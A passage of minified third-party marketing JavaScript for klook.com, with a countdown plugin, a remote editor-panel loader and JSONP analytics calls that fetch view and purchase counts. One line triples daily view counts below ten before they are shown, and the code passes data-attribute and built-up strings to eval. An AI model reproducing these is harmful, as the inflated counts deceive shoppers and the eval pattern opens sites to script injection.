s,n=e(this),a=["position","top","bottom","left","right","width","height"],o=e.effects.setMode(n,t.mode||"show"),r="show"===o,h=t.direction||"left",l="up"===h||"down"===h?"top":"left",u="up"===h||"left"===h,d={};e.effects.save(n,a),n.show(),s=t.distance||n["top"===l?"outerHeight":"outerWidth"](!0),e.effects.createWrapper(n).css({overflow:"hidden"}),r&&n.css(l,u?isNaN(s)?"-"+s:-s:s),d[l]=(r?u?"+=":"-=":u?"-=":"+=")+s,n.animate(d,{queue:!1,duration:t.duration,easing:t.easing,complete:function(){"hide"===o&&n.hide(),e.effects.restore(n,a),e.effects.removeWrapper(n),i()}})}})(sQuery);(function(e){e.effects.effect.transfer=function(t,i){var s=e(this),n=e(t.to),a="fixed"===n.css("position"),o=e("body"),r=a?o.scrollTop():0,h=a?o.scrollLeft():0,l=n.offset(),u={top:l.top-r,left:l.left-h,height:n.innerHeight(),width:n.innerWidth()},d=s.offset(),c=e('<div class="ui-effects-transfer"></div>').appendTo(document.body).addClass(t.className).css({top:d.top-r,left:d.left-h,height:s.innerHeight(),width:s.innerWidth(),position:a?"fixed":"absolute"}).animate(u,t.duration,t.easing,function(){c.remove(),i()})}})(sQuery);(function(){var j=false;window.JQClass=function(){};JQClass.classes={};JQClass.extend=function extender(f){var g=this.prototype;j=true;var h=new this();j=false;for(var i in f){h[i]=typeof f[i]=='function'&&typeof g[i]=='function'?(function(d,e){return function(){var b=this._super;this._super=function(a){return g[d].apply(this,a||[])};var c=e.apply(this,arguments);this._super=b;return c}})(i,f[i]):f[i]}function JQClass(){if(!j&&this._init){this._init.apply(this,arguments)}}JQClass.prototype=h;JQClass.prototype.constructor=JQClass;JQClass.extend=extender;return JQClass}})();(function($){JQClass.classes.JQPlugin=JQClass.extend({name:'plugin',defaultOptions:{},regionalOptions:{},_getters:[],_getMarker:function(){return'is-'+this.name},_init:function(){$.extend(this.defaultOptions,(this.regionalOptions&&this.regionalOptions[''])||{});var c=camelCase(this.name);$[c]=this;$.fn[c]=function(a){var b=Array.prototype.slice.call(arguments,1);if($[c]._isNotChained(a,b)){return $[c][a].apply($[c],[this[0]].concat(b))}return this.each(function(){if(typeof a==='string'){if(a[0]==='_'||!$[c][a]){throw'Unknown method: '+a;}$[c][a].apply($[c],[this].concat(b))}else{$[c]._attach(this,a)}})}},setDefaults:function(a){$.extend(this.defaultOptions,a||{})},_isNotChained:function(a,b){if(a==='option'&&(b.length===0||(b.length===1&&typeof b[0]==='string'))){return true}return $.inArray(a,this._getters)>-1},_attach:function(a,b){a=$(a);if(a.hasClass(this._getMarker())){return}a.addClass(this._getMarker());b=$.extend({},this.defaultOptions,this._getMetadata(a),b||{});var c=$.extend({name:this.name,elem:a,options:b},this._instSettings(a,b));a.data(this.name,c);this._postAttach(a,c);this.option(a,b)},_instSettings:function(a,b){return{}},_postAttach:function(a,b){},_getMetadata:function(d){try{var f=d.data(this.name.toLowerCase())||'';f=f.replace(/'/g,'"');f=f.replace(/([a-zA-Z0-9]+):/g,function(a,b,i){var c=f.substring(0,i).match(/"/g);return(!c||c.length%2===0?'"'+b+'":':b+':')});f=$.parseJSON('{'+f+'}');for(var g in f){var h=f[g];if(typeof h==='string'&&h.match(/^new Date\((.*)\)$/)){f[g]=eval(h)}}return f}catch(e){return{}}},_getInst:function(a){return $(a).data(this.name)||{}},option:function(a,b,c){a=$(a);var d=a.data(this.name);if(!b||(typeof b==='string'&&c==null)){var e=(d||{}).options;return(e&&b?e[b]:e)}if(!a.hasClass(this._getMarker())){return}var e=b||{};if(typeof b==='string'){e={};e[b]=c}this._optionsChanged(a,d,e);$.extend(d.options,e)},_optionsChanged:function(a,b,c){},destroy:function(a){a=$(a);if(!a.hasClass(this._getMarker())){return}this._preDestroy(a,this._getInst(a));a.removeData(this.name).removeClass(this._getMarker())},_preDestroy:function(a,b){}});function camelCase(c){return c.replace(/-([a-z])/g,function(a,b){return b.toUpperCase()})}$.JQPlugin={createPlugin:function(a,b){if(typeof a==='object'){b=a;a='JQPlugin'}a=camelCase(a);var c=camelCase(b.name);JQClass.classes[c]=JQClass.classes[a].extend(b);new JQClass.classes[c]()}}})(sQuery);(function($){var w='countdown';var Y=0;var O=1;var W=2;var D=3;var H=4;var M=5;var S=6;$.JQPlugin.createPlugin({name:w,defaultOptions:{until:null,since:null,timezone:null,serverSync:null,format:'dHMS',layout:'',compact:false,padZeroes:false,significant:0,description:'',expiryUrl:'',expiryText:'',alwaysExpire:false,onExpiry:null,onTick:null,tickInterval:1},regionalOptions:{'':{labels:['Years','Months','Weeks','Days','Hours','Minutes','Seconds'],labels1:['Year','Month','Week','Day','Hour','Minute','Second'],compactLabels:['y','m','w','d'],whichLabels:null,digits:['0','1','2','3','4','5','6','7','8','9'],timeSeparator:':',isRTL:false}},_getters:['getTimes'],_rtlClass:w+'-rtl',_sectionClass:w+'-section',_amountClass:w+'-amount',_periodClass:w+'-period',_rowClass:w+'-row',_holdingClass:w+'-holding',_showClass:w+'-show',_descrClass:w+'-descr',_timerElems:[],_init:function(){var c=this;this._super();this._serverSyncs=[];var d=(typeof Date.now=='function'?Date.now:function(){return new Date().getTime()});var e=(window.performance&&typeof window.performance.now=='function');function timerCallBack(a){var b=(a<1e12?(e?(performance.now()+performance.timing.navigationStart):d()):a||d());if(b-g>=1000){c._updateElems();g=b}f(timerCallBack)}var f=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||null;var g=0;if(!f||$.noRequestAnimationFrame){$.noRequestAnimationFrame=null;setInterval(function(){c._updateElems()},980)}else{g=window.animationStartTime||window.webkitAnimationStartTime||window.mozAnimationStartTime||window.oAnimationStartTime||window.msAnimationStartTime||d();f(timerCallBack)}},UTCDate:function(a,b,c,e,f,g,h,i){if(typeof b=='object'&&b.constructor==Date){i=b.getMilliseconds();h=b.getSeconds();g=b.getMinutes();f=b.getHours();e=b.getDate();c=b.getMonth();b=b.getFullYear()}var d=new Date();d.setUTCFullYear(b);d.setUTCDate(1);d.setUTCMonth(c||0);d.setUTCDate(e||1);d.setUTCHours(f||0);d.setUTCMinutes((g||0)-(Math.abs(a)<30?a*60:a));d.setUTCSeconds(h||0);d.setUTCMilliseconds(i||0);return d},periodsToSeconds:function(a){return a[0]*31557600+a[1]*2629800+a[2]*604800+a[3]*86400+a[4]*3600+a[5]*60+a[6]},_instSettings:function(a,b){return{_periods:[0,0,0,0,0,0,0]}},_addElem:function(a){if(!this._hasElem(a)){this._timerElems.push(a)}},_hasElem:function(a){return($.inArray(a,this._timerElems)>-1)},_removeElem:function(b){this._timerElems=$.map(this._timerElems,function(a){return(a==b?null:a)})},_updateElems:function(){for(var i=this._timerElems.length-1;i>=0;i--){this._updateCountdown(this._timerElems[i])}},_optionsChanged:function(a,b,c){if(c.layout){c.layout=c.layout.replace(/&lt;/g,'<').replace(/&gt;/g,'>')}this._resetExtraLabels(b.options,c);var d=(b.options.timezone!=c.timezone);$.extend(b.options,c);this._adjustSettings(a,b,c.until!=null||c.since!=null||d);var e=new Date();if((b._since&&b._since<e)||(b._until&&b._until>e)){this._addElem(a[0])}this._updateCountdown(a,b)},_updateCountdown:function(a,b){a=a.jquery?a:$(a);b=b||this._getInst(a);if(!b){return}a.html(this._generateHTML(b)).toggleClass(this._rtlClass,b.options.isRTL);if($.isFunction(b.options.onTick)){var c=b._hold!='lap'?b._periods:this._calculatePeriods(b,b._show,b.options.significant,new Date());if(b.options.tickInterval==1||this.periodsToSeconds(c)%b.options.tickInterval==0){b.options.onTick.apply(a[0],[c])}}var d=b._hold!='pause'&&(b._since?b._now.getTime()<b._since.getTime():b._now.getTime()>=b._until.getTime());if(d&&!b._expiring){b._expiring=true;if(this._hasElem(a[0])||b.options.alwaysExpire){this._removeElem(a[0]);if($.isFunction(b.options.onExpiry)){b.options.onExpiry.apply(a[0],[])}if(b.options.expiryText){var e=b.options.layout;b.options.layout=b.options.expiryText;this._updateCountdown(a[0],b);b.options.layout=e}if(b.options.expiryUrl){window.location=b.options.expiryUrl}}b._expiring=false}else if(b._hold=='pause'){this._removeElem(a[0])}},_resetExtraLabels:function(a,b){for(var n in b){if(n.match(/[Ll]abels[02-9]|compactLabels1/)){a[n]=b[n]}}for(var n in a){if(n.match(/[Ll]abels[02-9]|compactLabels1/)&&typeof b[n]==='undefined'){a[n]=null}}},_adjustSettings:function(a,b,c){var d;var e=0;var f=null;for(var i=0;i<this._serverSyncs.length;i++){if(this._serverSyncs[i][0]==b.options.serverSync){f=this._serverSyncs[i][1];break}}if(f!=null){e=(b.options.serverSync?f:0);d=new Date()}else{var g=($.isFunction(b.options.serverSync)?b.options.serverSync.apply(a[0],[]):null);d=new Date();e=(g?d.getTime()-g.getTime():0);this._serverSyncs.push([b.options.serverSync,e])}var h=b.options.timezone;h=(h==null?-d.getTimezoneOffset():h);if(c||(!c&&b._until==null&&b._since==null)){b._since=b.options.since;if(b._since!=null){b._since=this.UTCDate(h,this._determineTime(b._since,null));if(b._since&&e){b._since.setMilliseconds(b._since.getMilliseconds()+e)}}b._until=this.UTCDate(h,this._determineTime(b.options.until,d));if(e){b._until.setMilliseconds(b._until.getMilliseconds()+e)}}b._show=this._determineShow(b)},_preDestroy:function(a,b){this._removeElem(a[0]);a.empty()},pause:function(a){this._hold(a,'pause')},lap:function(a){this._hold(a,'lap')},resume:function(a){this._hold(a,null)},toggle:function(a){var b=$.data(a,this.name)||{};this[!b._hold?'pause':'resume'](a)},toggleLap:function(a){var b=$.data(a,this.name)||{};this[!b._hold?'lap':'resume'](a)},_hold:function(a,b){var c=$.data(a,this.name);if(c){if(c._hold=='pause'&&!b){c._periods=c._savePeriods;var d=(c._since?'-':'+');c[c._since?'_since':'_until']=this._determineTime(d+c._periods[0]+'y'+d+c._periods[1]+'o'+d+c._periods[2]+'w'+d+c._periods[3]+'d'+d+c._periods[4]+'h'+d+c._periods[5]+'m'+d+c._periods[6]+'s');this._addElem(a)}c._hold=b;c._savePeriods=(b=='pause'?c._periods:null);$.data(a,this.name,c);this._updateCountdown(a,c)}},getTimes:function(a){var b=$.data(a,this.name);return(!b?null:(b._hold=='pause'?b._savePeriods:(!b._hold?b._periods:this._calculatePeriods(b,b._show,b.options.significant,new Date()))))},_determineTime:function(k,l){var m=this;var n=function(a){var b=new Date();b.setTime(b.getTime()+a*1000);return b};var o=function(a){a=a.toLowerCase();var b=new Date();var c=b.getFullYear();var d=b.getMonth();var e=b.getDate();var f=b.getHours();var g=b.getMinutes();var h=b.getSeconds();var i=/([+-]?[0-9]+)\s*(s|m|h|d|w|o|y)?/g;var j=i.exec(a);while(j){switch(j[2]||'s'){case's':h+=parseInt(j[1],10);break;case'm':g+=parseInt(j[1],10);break;case'h':f+=parseInt(j[1],10);break;case'd':e+=parseInt(j[1],10);break;case'w':e+=parseInt(j[1],10)*7;break;case'o':d+=parseInt(j[1],10);e=Math.min(e,m._getDaysInMonth(c,d));break;case'y':c+=parseInt(j[1],10);e=Math.min(e,m._getDaysInMonth(c,d));break}j=i.exec(a)}return new Date(c,d,e,f,g,h,0)};var p=(k==null?l:(typeof k=='string'?o(k):(typeof k=='number'?n(k):k)));if(p)p.setMilliseconds(0);return p},_getDaysInMonth:function(a,b){return 32-new Date(a,b,32).getDate()},_normalLabels:function(a){return a},_generateHTML:function(c){var d=this;c._periods=(c._hold?c._periods:this._calculatePeriods(c,c._show,c.options.significant,new Date()));var e=false;var f=0;var g=c.options.significant;var h=$.extend({},c._show);for(var i=Y;i<=S;i++){e|=(c._show[i]=='?'&&c._periods[i]>0);h[i]=(c._show[i]=='?'&&!e?null:c._show[i]);f+=(h[i]?1:0);g-=(c._periods[i]>0?1:0)}var j=[false,false,false,false,false,false,false];for(var i=S;i>=Y;i--){if(c._show[i]){if(c._periods[i]){j[i]=true}else{j[i]=g>0;g--}}}var k=(c.options.compact?c.options.compactLabels:c.options.labels);var l=c.options.whichLabels||this._normalLabels;var m=function(a){var b=c.options['compactLabels'+l(c._periods[a])];return(h[a]?d._translateDigits(c,c._periods[a])+(b?b[a]:k[a])+' ':'')};var n=(c.options.padZeroes?2:1);var o=function(a){var b=c.options['labels'+l(c._periods[a])];return((!c.options.significant&&h[a])||(c.options.significant&&j[a])?'<span class="'+d._sectionClass+'">'+'<span class="'+d._amountClass+'">'+d._minDigits(c,c._periods[a],n)+'</span>'+'<span class="'+d._periodClass+'">'+(b?b[a]:k[a])+'</span></span>':'')};return(c.options.layout?this._buildLayout(c,h,c.options.layout,c.options.compact,c.options.significant,j):((c.options.compact?'<span class="'+this._rowClass+' '+this._amountClass+(c._hold?' '+this._holdingClass:'')+'">'+m(Y)+m(O)+m(W)+m(D)+(h[H]?this._minDigits(c,c._periods[H],2):'')+(h[M]?(h[H]?c.options.timeSeparator:'')+this._minDigits(c,c._periods[M],2):'')+(h[S]?(h[H]||h[M]?c.options.timeSeparator:'')+this._minDigits(c,c._periods[S],2):''):'<span class="'+this._rowClass+' '+this._showClass+(c.options.significant||f)+(c._hold?' '+this._holdingClass:'')+'">'+o(Y)+o(O)+o(W)+o(D)+o(H)+o(M)+o(S))+'</span>'+(c.options.description?'<span class="'+this._rowClass+' '+this._descrClass+'">'+c.options.description+'</span>':'')))},_buildLayout:function(c,d,e,f,g,h){var j=c.options[f?'compactLabels':'labels'];var k=c.options.whichLabels||this._normalLabels;var l=function(a){return(c.options[(f?'compactLabels':'labels')+k(c._periods[a])]||j)[a]};var m=function(a,b){return c.options.digits[Math.floor(a/b)%10]};var o={desc:c.options.description,sep:c.options.timeSeparator,yl:l(Y),yn:this._minDigits(c,c._periods[Y],1),ynn:this._minDigits(c,c._periods[Y],2),ynnn:this._minDigits(c,c._periods[Y],3),y1:m(c._periods[Y],1),y10:m(c._periods[Y],10),y100:m(c._periods[Y],100),y1000:m(c._periods[Y],1000),ol:l(O),on:this._minDigits(c,c._periods[O],1),onn:this._minDigits(c,c._periods[O],2),onnn:this._minDigits(c,c._periods[O],3),o1:m(c._periods[O],1),o10:m(c._periods[O],10),o100:m(c._periods[O],100),o1000:m(c._periods[O],1000),wl:l(W),wn:this._minDigits(c,c._periods[W],1),wnn:this._minDigits(c,c._periods[W],2),wnnn:this._minDigits(c,c._periods[W],3),w1:m(c._periods[W],1),w10:m(c._periods[W],10),w100:m(c._periods[W],100),w1000:m(c._periods[W],1000),dl:l(D),dn:this._minDigits(c,c._periods[D],1),dnn:this._minDigits(c,c._periods[D],2),dnnn:this._minDigits(c,c._periods[D],3),d1:m(c._periods[D],1),d10:m(c._periods[D],10),d100:m(c._periods[D],100),d1000:m(c._periods[D],1000),hl:l(H),hn:this._minDigits(c,c._periods[H],1),hnn:this._minDigits(c,c._periods[H],2),hnnn:this._minDigits(c,c._periods[H],3),h1:m(c._periods[H],1),h10:m(c._periods[H],10),h100:m(c._periods[H],100),h1000:m(c._periods[H],1000),ml:l(M),mn:this._minDigits(c,c._periods[M],1),mnn:this._minDigits(c,c._periods[M],2),mnnn:this._minDigits(c,c._periods[M],3),m1:m(c._periods[M],1),m10:m(c._periods[M],10),m100:m(c._periods[M],100),m1000:m(c._periods[M],1000),sl:l(S),sn:this._minDigits(c,c._periods[S],1),snn:this._minDigits(c,c._periods[S],2),snnn:this._minDigits(c,c._periods[S],3),s1:m(c._periods[S],1),s10:m(c._periods[S],10),s100:m(c._periods[S],100),s1000:m(c._periods[S],1000)};var p=e;for(var i=Y;i<=S;i++){var q='yowdhms'.charAt(i);var r=new RegExp('\\{'+q+'<\\}([\\s\\S]*)\\{'+q+'>\\}','g');p=p.replace(r,((!g&&d[i])||(g&&h[i])?'$1':''))}$.each(o,function(n,v){var a=new RegExp('\\{'+n+'\\}','g');p=p.replace(a,v)});return p},_minDigits:function(a,b,c){b=''+b;if(b.length>=c){return this._translateDigits(a,b)}b='0000000000'+b;return this._translateDigits(a,b.substr(b.length-c))},_translateDigits:function(b,c){return(''+c).replace(/[0-9]/g,function(a){return b.options.digits[a]})},_determineShow:function(a){var b=a.options.format;var c=[];c[Y]=(b.match('y')?'?':(b.match('Y')?'!':null));c[O]=(b.match('o')?'?':(b.match('O')?'!':null));c[W]=(b.match('w')?'?':(b.match('W')?'!':null));c[D]=(b.match('d')?'?':(b.match('D')?'!':null));c[H]=(b.match('h')?'?':(b.match('H')?'!':null));c[M]=(b.match('m')?'?':(b.match('M')?'!':null));c[S]=(b.match('s')?'?':(b.match('S')?'!':null));return c},_calculatePeriods:function(c,d,e,f){c._now=f;c._now.setMilliseconds(0);var g=new Date(c._now.getTime());if(c._since){if(f.getTime()<c._since.getTime()){c._now=f=g}else{f=c._since}}else{g.setTime(c._until.getTime());if(f.getTime()>c._until.getTime()){c._now=f=g}}var h=[0,0,0,0,0,0,0];if(d[Y]||d[O]){var i=this._getDaysInMonth(f.getFullYear(),f.getMonth());var j=this._getDaysInMonth(g.getFullYear(),g.getMonth());var k=(g.getDate()==f.getDate()||(g.getDate()>=Math.min(i,j)&&f.getDate()>=Math.min(i,j)));var l=function(a){return(a.getHours()*60+a.getMinutes())*60+a.getSeconds()};var m=Math.max(0,(g.getFullYear()-f.getFullYear())*12+g.getMonth()-f.getMonth()+((g.getDate()<f.getDate()&&!k)||(k&&l(g)<l(f))?-1:0));h[Y]=(d[Y]?Math.floor(m/12):0);h[O]=(d[O]?m-h[Y]*12:0);f=new Date(f.getTime());var n=(f.getDate()==i);var o=this._getDaysInMonth(f.getFullYear()+h[Y],f.getMonth()+h[O]);if(f.getDate()>o){f.setDate(o)}f.setFullYear(f.getFullYear()+h[Y]);f.setMonth(f.getMonth()+h[O]);if(n){f.setDate(o)}}var p=Math.floor((g.getTime()-f.getTime())/1000);var q=function(a,b){h[a]=(d[a]?Math.floor(p/b):0);p-=h[a]*b};q(W,604800);q(D,86400);q(H,3600);q(M,60);q(S,1);if(p>0&&!c._since){var r=[1,12,4.3482,7,24,60,60];var s=S;var t=1;for(var u=S;u>=Y;u--){if(d[u]){if(h[s]>=t){h[s]=0;p=1}if(p>0){h[u]++;p=0;s=u;t=1}}t*=r[u]}}if(e){for(var u=Y;u<=S;u++){if(e&&h[u]){e--}else if(!e){h[u]=0}}}return h}})})(sQuery);partnerName="klook";partner_site={"scheme":"https","host":"www.klook.com"};partner_site.host=partner_site.host.replace(/^www\./,'');var cookieDomain="."+partner_site.host;var isInIFrame=(window.location!=window.top.location);var panelEdit=false;if(isInIFrame==true){sQuery.cookie('ins-panel',1,{expires:3650,path:'/',domain:'.'+partner_site.host});panelEdit=true;}
else{sQuery.cookie('ins-panel',null,{expires:-1,path:'/',domain:'.'+partner_site.host});}
if(typeof disabledEdit!='undefined'&&disabledEdit==true){panelEdit=false;}
function loadPanelView(){var js=undefined;var count=0;pm.bind('apiControl',function(){return'1';});if(panelEdit==true){var checkIframe=setInterval(function(){if(count==5&&js==undefined){clearInterval(checkIframe);window.panelEdit=false;panelEdit=false;spApi.init();return false;}
count++;pm({target:window.top,type:'checkIframe',data:{},success:function(result){if(typeof js==='object'){clearInterval(checkIframe);return false;}
var scriptSource=spApi.apiUrl+'edit/';var prototypeInterval=setInterval(function(){if(typeof Prototype!=='undefined'&&Prototype.Version<'1.7'&&Array.prototype.toJSON){delete Array.prototype.toJSON;delete Array.prototype.toArray;clearInterval(prototypeInterval);}},10);setTimeout(function(){if(typeof prototypeInterval!=='undefined'){clearInterval(prototypeInterval);}},3000);js=result;if(typeof js==='object'){window.ActionBuilderSettings=js.config;var appPath=result.config.app.appPath;if(typeof appPath=='undefined'){appPath=scriptSource+'actionbuilder/frame/app.js';}
var html_doc=document.getElementsByTagName('head')[0];var scriptElement=document.createElement('script');scriptElement.setAttribute('language','javascript');scriptElement.setAttribute('type','text/javascript');scriptElement.setAttribute('src',appPath+'?v='+spApi.genDate);html_doc.appendChild(scriptElement);clearInterval(checkIframe);}else{var scriptElement=document.createElement('script');scriptElement.type='text/javascript';scriptElement.src=scriptSource+js+'?'+new Date().getTime();document.getElementsByTagName('head')[0].appendChild(scriptElement);clearInterval(checkIframe);}}});},100);}}
sQuery(document).ready(function(){loadPanelView();});function getAnalytics(callback){esCountAnalytics(callback);}function esCountAnalytics(callback,campId){if(!spApi.isOnProductPage()){return;}
var uniqueID=(spApi.getCurrentProduct()||{}).id;if(typeof uniqueID==='undefined'){return;}
if(typeof window.spPageVisitCount!="undefined"&&typeof callback!="undefined"){callback(window.spPageVisitCount);return;}
if(typeof spApi.analyticsCallbacks=="undefined"){spApi.analyticsCallbacks=[];if(typeof callback!="undefined")
spApi.analyticsCallbacks.push(callback);}else{if(typeof callback!="undefined")
spApi.analyticsCallbacks.push(callback);return;}
var instantView=false;var dailyView=false;var isUniqueView=false;sQuery.each(spApi.notifies,function(i,val){if(val.kkbSettings!=null){sQuery.each(val.kkbSettings,function(kkbIndex,kkbVal){if(kkbIndex=="@instantView"){instantView=true;}
if(kkbIndex=="@dailyView"){dailyView=true;}});}});if(dailyView!=true&&instantView!=true)
return;if(isUniqueView){if(spApi.sessionStorageGet(uniqueID)){isUniqueView=true;}else{spApi.sessionStorageSet(uniqueID,uniqueID);isUniqueView=false;}}
sQuery.ajax({url:"//kkbv2.api.sociaplus.com?t=esCountAnalytics&instantView="+instantView+"&dailyView="+dailyView,data:{uniqueID:uniqueID,partnerName:"klook",isUniqueView:isUniqueView,campId:campId,kkbRandomSettings:spApi.notifies[campId].kkbRandomSettings},type:"get",dataType:"jsonp",async:spApi.isAjaxAsync,jsonpCallback:"parseAnalyticsData",success:function(e){var isDataAvailable=(dailyView&&e.count.dailyView>-1)||(instantView&&e.count.instantView>-1);if(typeof e=="object"&&isDataAvailable){window.success10=e.count.dailyView<10?e.count.dailyView*3:e.count.dailyView;window.spPageVisitCount=e.count;sQuery.each(spApi.analyticsCallbacks,function(i,funct){funct(e.count);});spApi.analyticsCallbacks=undefined;}}});}
function parseAnalyticsData(e){}function esLiveFeed(callback){if(!spApi.isOnProductPage()){return;}
if(typeof window.esFeedData!="undefined"&&typeof callback!="undefined"){callback(window.esFeedData);return;}
if(typeof spApi.historyCallbacks=="undefined"){spApi.historyCallbacks=[];if(typeof callback!="undefined")
spApi.historyCallbacks.push(callback);}else{if(typeof callback!="undefined")
spApi.historyCallbacks.push(callback);return;}
var lastPurchaseTime=false;var dailyPurchase=false;var instantPurchase=false;var inBasket=false;sQuery.each(spApi.notifies,function(id,notify){if(lastPurchaseTime==false&&notify.content.indexOf("@lastPurchasedTime")!=-1){lastPurchaseTime=true;}
if(dailyPurchase==false&&notify.content.indexOf("@dailyPurchase")!=-1){dailyPurchase=true;}
if(instantPurchase==false&&notify.content.indexOf("@instantPurchase")!=-1){instantPurchase=true;}
if(inBasket==false&&notify.content.indexOf("@inBasketCount")!=-1){inBasket=true;}});sQuery.each(spApi.notifies,function(id,notify){if(notify.kkbSettings!=null){sQuery.each(notify.kkbSettings,function(property,value){if(dailyPurchase==false&&property=="@dailyPurchase"){dailyPurchase=true;}
if(lastPurchaseTime==false&&property=="@lastPurchaseTime"){lastPurchaseTime=true;}
if(instantPurchase==false&&property=="@instantPurchase"){instantPurchase=true;}
if(inBasket==false&&property=="@inBasketCount"){inBasket=true;}});}});var uniqueID=(spApi.getCurrentProduct()||{}).id;sQuery.ajax({url:"//kkbv2.api.sociaplus.com?t=getKksHistory&lastPurchaseTime="+lastPurchaseTime+"&dailyPurchase="+dailyPurchase+"&instantPurchase="+instantPurchase+"&inCartCount="+inBasket,data:{uniqueID:uniqueID,partnerName:"klook"},type:"get",dataType:"jsonp",async:spApi.isAjaxAsync,jsonpCallback:"parsehistoryData",success:function(e){window.esFeedData=e;sQuery.each(spApi.historyCallbacks,function(i,funct){funct(e);});spApi.historyCallbacks=undefined;}});function parsehistoryData(e){}
function parseCustomPlusData(e){}
function parseNotifyData(e){}}
protocol=('https:'==document.location.protocol?'https://':'http://');var _json_stringify=JSON.stringify;JSON.stringify=function(object,replacer,space){var Prototype=window.Prototype;if(typeof Prototype!=='undefined'&&Prototype.Version<'1.7'&&Array.prototype.toJSON&&Object.toJSON){return Object.toJSON(object)}
return _json_stringify(object,replacer,space);}
sQuery.fn.extend({exists:function(){return this.length>0;},elementLoadComplete:function(callback,config,notFoundCallback){var defaults={i:10,t:5000};var config=sQuery.extend(defaults,config);var self=this;var i=setInterval(function(){if(sQuery(self.selector).length>0){clearInterval(i);if(typeof callback==='function'){return callback();}}},config.i);setTimeout(function(){if(typeof i!=='undefined'){clearInterval(i);if(typeof notFoundCallback==='function'){notFoundCallback();}}},config.t);return this;}});function setSessionOnlyCookie(cookieName,cookieValue){if(navigator.userAgent.indexOf('MSIE')!==-1||navigator.appVersion.indexOf('Trident/')>0){document.cookie=cookieName+"="+cookieValue+"; path=/";}else{document.cookie=cookieName+'='+cookieValue+';path=/'+';expires='+'0';}}
var getCookies=function(){var pairs=document.cookie.split(";");var cookies={};for(var i=0;i<pairs.length;i++){var pair=pairs[i].split("=");cookies[pair[0]]=unescape(pair[1]);}
return cookies;};var ajaxSupport="0";var initCondition="typeof spPanelPreview != 'undefined' && spPanelPreview != false) || false || spApi.customizationCamps.length > 0 || spApi.camps.length > 0 || sQuery.cookie('sp-notes') != undefined || false ";if(typeof spPanelPreview=="undefined"||spPanelPreview!=true){var disable_camp=false;}
else{var disable_camp=true;}
spApi={loadScript:spApi.loadScript,isAjaxAsync:false,globalUserIdIsDisabled:false,viewedCustomCamps:[],ieSupport:0,Base64:{_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){if(typeof e==="undefined"||e===null)return false;var t="";var n,r,i,s,o,u,a;var f=0;e=spApi.Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9\+\/\=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=spApi.Base64._utf8_decode(t);return t},_utf8_encode:function(e){try{e=e.replace(/\r\n/g,"\n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t}catch(err){spApi.errLog(err,{logType:"UTF8 Fonksiyonu Hatas",bugType:"partner",extraData:{fonksiyon:"_utf8_encode",parameter:e}})}},_utf8_decode:function(e){try{var t="";var n=0;var r=0;var c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}catch(err){spApi.errLog(err,{logType:"UTF8 Fonksiyonu Hatas",bugType:"partner",extraData:{fonksiyon:"_utf8_decode",parameter:e}})}}},consoleLog:[],salesSesId:'MA==',goalList:[],goalObserverStatus:false,goalLogs:[],dbLog:[],errLogActive:true,esResultCheck:function(campId,logic,value,aggrName){return spApi.e("(this.gaDimensionQ['"+campId+"_"+aggrName+"'] "+logic+" "+value+")");},webPushPermission:{setState:function(pushStorageData){if(pushStorageData.insdrSubsId){spApi.storageData('insUserPermissionGranted',{state:true},{expires:730});}else if(pushStorageData.pushRequestSent){spApi.storageData('insUserPermissionGranted',{state:false},{expires:730});}else{spApi.storageData('insUserPermissionGranted',{state:null},{expires:730});}},initState:function(){spApi.worker.asyncPM('getPushStorageData',{},function(pushStorageData){spApi.webPushPermission.setState(pushStorageData);});},getState:function(){var storageData=JSON.parse(spApi.storageData('insUserPermissionGranted'));if(storageData){return storageData.state;}
return storageData;}},highlight:function(element,options){return sQuery(element).highlight(options);},mask:sQuery.mask,gaDimensionQ:{},getBrowser:function(version,lowerCase){var ua=navigator.userAgent,tem,M=ua.match(/(yabrowser|opera|chrome|safari|firefox|msie|edge|maxthon|trident|ubrowser|ucbrowser(?=\/))\/?\s*(\d+)/i)||[];var done=false;if(/trident/i.test(M[1])){tem=/\brv[ :]+(\d+)/g.exec(ua)||[];M[0]='IE';M[1]=(tem[1]||-1);done=true;}else if(M[1]==='Chrome'){if(ua.match(/\b(Edge)\/(\d+)/)!=null){tem=ua.match(/\b(Edge)\/(\d+)/);done=true;M[0]='Edge';M[1]=(tem[2]||-1);}else if(ua.match(/\b(YaBrowser)\/(\d+)/)!=null){tem=ua.match(/\b(YaBrowser)\/(\d+)/);done=true;M[0]='Yandex';M[1]=(tem[2]||-1);}else if(ua.match(/\b(OPR)\/(\d+)/)!=null){tem=ua.match(/\b(OPR)\/(\d+)/);done=true;M[0]='Opera';M[1]=(tem[2]||-1);}else if(ua.match(/\b(UBrowser)\/(\d+)/)!=null){tem=ua.match(/\b(UBrowser)\/(\d+)/);done=true;M[0]='UCBrowser';M[1]=(tem[2]||-1);}}
